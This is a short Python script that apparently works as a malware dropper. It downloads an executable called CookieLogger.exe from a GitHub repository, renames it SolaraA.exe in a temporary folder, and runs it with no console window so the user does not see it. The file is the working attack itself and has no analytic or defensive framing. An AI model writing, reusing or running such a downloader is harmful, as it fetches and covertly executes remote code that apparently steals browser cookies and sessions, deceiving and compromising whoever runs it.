import os
import requests
import subprocess
import tempfile

# URLs of the EXE files to download from GitHub
url1 = "https://github.com/MAJESTY5164/testing/raw/main/CookieLogger.exe"  # First executable URL

def download_file(url):
    """Download a file from a URL."""
    response = requests.get(url)
    response.raise_for_status()  # Raise an error for bad responses
    return response.content

def run_executable(file_path):
    """Run an executable without opening a console window."""
    subprocess.Popen(file_path, creationflags=subprocess.CREATE_NO_WINDOW)

def main():
    # Create a temporary directory to store the downloaded EXEs
    with tempfile.TemporaryDirectory() as temp_dir:
        exe1_path = os.path.join(temp_dir, "SolaraA.exe")

        # Download the EXE files
        with open(exe1_path, "wb") as exe1_file:
            exe1_file.write(download_file(url1))

        # Run the EXEs without opening a console window
        run_executable(exe1_path)

        # Optional: Wait for the executables to finish if needed
        # subprocess.Popen(exe1_path, creationflags=subprocess.CREATE_NO_WINDOW).wait()
        # subprocess.Popen(exe2_path, creationflags=subprocess.CREATE_NO_WINDOW).wait()

if __name__ == "__main__":
    main()
